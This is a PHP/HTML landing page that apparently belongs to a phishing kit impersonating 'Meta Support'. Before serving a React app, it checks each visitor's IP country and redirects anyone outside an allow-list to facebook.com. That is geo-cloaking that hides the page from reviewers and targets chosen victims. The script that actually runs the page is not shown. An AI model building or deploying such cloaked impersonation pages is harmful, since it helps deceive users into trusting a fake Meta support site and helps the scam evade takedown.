<?php
require_once 'config.php';

$ipbot = $ipbot = new IPBot();
$ipbot_response = $ipbot->getDetails($_SERVER['REMOTE_ADDR']);

if ($ipbot_response) {
  if (!empty($ipbot_response['ip_address'])) {
    if (!in_array($ipbot_response['country_code'], $config['allowed_countries'])) {
      header("Location: https://facebook.com");
      exit;
    }
  }
}
?><!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="./meta.png" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    <link rel="manifest" href="./manifest.json" />
    <title>Meta Support</title>
    <script defer="defer" src="./static/js/main.e60d9635.js"></script>
    <link href="./static/css/main.5b3d3c90.css" rel="stylesheet" />
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
  </body>
</html>
